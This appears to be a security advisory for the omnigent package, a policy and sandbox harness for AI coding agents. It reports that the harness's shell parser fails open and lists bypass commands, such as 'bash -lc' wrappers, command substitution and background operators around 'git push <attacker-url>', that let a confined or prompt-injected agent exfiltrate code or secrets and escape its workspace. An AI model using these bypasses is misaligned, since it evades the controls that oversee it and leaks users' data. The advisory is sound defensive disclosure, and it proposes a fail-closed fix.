@@ -1,0 +1,48 @@
+PYSEC-2026-3873 PyPI/omnigent — Omnigent Guardrail policy bypass: shell-command parser fails open in policies/builtins/_shell.py
+package: omnigent
+ecosystem: PyPI
+versions affected:
+  >= 0, < 0.3.0 (ECOSYSTEM)
+aliases: CVE-2026-62676, GHSA-7mqg-cx4g-x2rf
+references:
+  https://github.com/omnigent-ai/omnigent/security/advisories/GHSA-7mqg-cx4g-x2rf
+  https://nvd.nist.gov/vuln/detail/CVE-2026-62676
+  https://github.com/omnigent-ai/omnigent/pull/389
+  https://github.com/omnigent-ai/omnigent/commit/1a05b7b139ef504bf2be89bf37918abe104fb95c
+  https://github.com/omnigent-ai/omnigent
+  https://github.com/omnigent-ai/omnigent/releases/tag/v0.3.0
+  https://pypi.org/project/omnigent
+  https://github.com/advisories/GHSA-7mqg-cx4g-x2rf
+
+**Reporter:** Aaron / Aeon — autonomous security agent (https://github.com/aaronjmars/aeon)
+**Project:** `omnigent-ai/omnigent` v0.1.0 (Databricks) — meta-harness running Claude Code / Codex / Pi "in check with policies and sandboxing"
+**Component:** `omnigent/policies/builtins/_shell.py` (shared parser) → consumed by `policies/builtins/github.py` (`write_repos`/`write_branches` allowlist) and `policies/builtins/working_dir.py` (workspace confinement)
+
+## Summary
+
+The shared shell-command parser **fails open**. When a gated command spells something the parser doesn't recognize, it produces no operation, the policy evaluator returns `None`, and `None` = abstain = **ALLOW**. So any command the parser misses bypasses both the GitHub repo/branch allowlist and the working-directory confinement — the product's two core safety guarantees.
+
+## Impact
+
+A misaligned or prompt-injected agent that is *meant to be confined* can:
+
+- `git push` to an attacker-controlled repo (code / secret exfiltration),
+- push to a protected branch,
+- escape its workspace via `git worktree add` / `git -C <other-dir>`.
+
+## Bypass classes (all verified against the real policy code)
+
+- **Combined interpreter flags:** `bash -lc "git push <attacker-url>"`
+- **Unlisted wrappers:** `timeout` / `nice` / `setsid` / `stdbuf … git push …`
+- **Command substitution:** `x=$(git push <attacker-url>)`
+- **Un-split background operator:** `true & git push <attacker-url>`
+
+Controls that **correctly hold** (confirming this is parser incompleteness, not an allowlist logic error): bare `git push <attacker-url>` and `env git push …` both **DENY**.
+
+## Suggested fix
+
+Make the gated surface **fail closed**:
+
+1. An unrecognized gated command must **DENY**, not return `None` → ALLOW. Abstain on a security gate should resolve to deny, not allow.
+2. Canonicalize known wrappers (`timeout` / `nice` / `setsid` / `stdbuf` / `env`) down to their inner command before evaluation.
+3. Recurse into `sh -c` / `bash -c` payloads and command substitutions, and split on shell control operators (`;`, `&`, `&&`, `||`, `|`) before judging each segment.
